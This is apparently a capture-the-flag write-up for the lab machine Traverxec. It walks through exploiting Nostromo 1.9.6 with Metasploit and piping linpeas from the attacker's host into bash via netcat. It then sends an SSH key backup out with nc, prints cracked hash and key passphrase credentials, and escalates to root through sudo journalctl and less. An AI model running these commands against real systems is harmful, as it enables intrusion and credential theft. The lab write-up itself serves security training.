MACHINE NAME: TRAVERXEC
MACHINE IP: 10.10.10.165


#Recon and Enumeration.

Two ports are open, port 22 and 80, running HTTP and SSH.

Port 80 is running a service called nostromo 1.9.6. This seems like an interesting one, we'll have a closer look at this one.

A quick lookup with searchsploit tells us that version1.9.6 has a Remote Code Execution vulnerability.
From this point, we can manually explit this, there exist a PoC on exploitdb that we could use. Alternatively, we can turn to metasploit to exploit.

Using Metasploit, get a shell which we can the stabilize.

python -c 'import pty;pty.spawn("/bin/bash")'

which nc

we see a bin/bash/nc

On host: nc -lvnp 9001 < linpeas.sh 

On Remote system: nc <tun0> 9001 | bash

Through the LinEnum, we discover a user; david.

-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                                                   
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Crack the hash using john/hashcrack.

david: Nowonly4me

Navigating to /home/david/public_www we find some two interesting files, index.html and protected-file-area

The protected area folder has some backup ssh keys.

on rhost: nc 10.10.15.58 9001 < backup-ssh-identity-files.tgz

on lhost: nc -lvnp 9001 > backup.tgz

tar -xzvf tar.gz

cd /home/david/.ssh/

cat id_rsa ; this is an encrypted private key.


python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

the cracked cred: hunter

chmod 600 id_rsa

ssh -i id_rsa david@10.10.10.165

David user has an interesting folder named bin. cd into this directory, and read the contents of server-stats.sh

This last line is of particular interest: /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service


Exploiting journalctrl
I’ll look up journalctrl on gtfobins, and there is a sudo option. It’s quite short, simply saying:

sudo journalctl !/bin/sh

The trick here is that journalctrl will output to stdout if it can fit onto the current page, but into less if it can’t. Since I’m running it with -n 5, that means only five lines come out, so I need to shrink my terminal to smaller than 5 lines, and I’ll get sent into less, still as root.
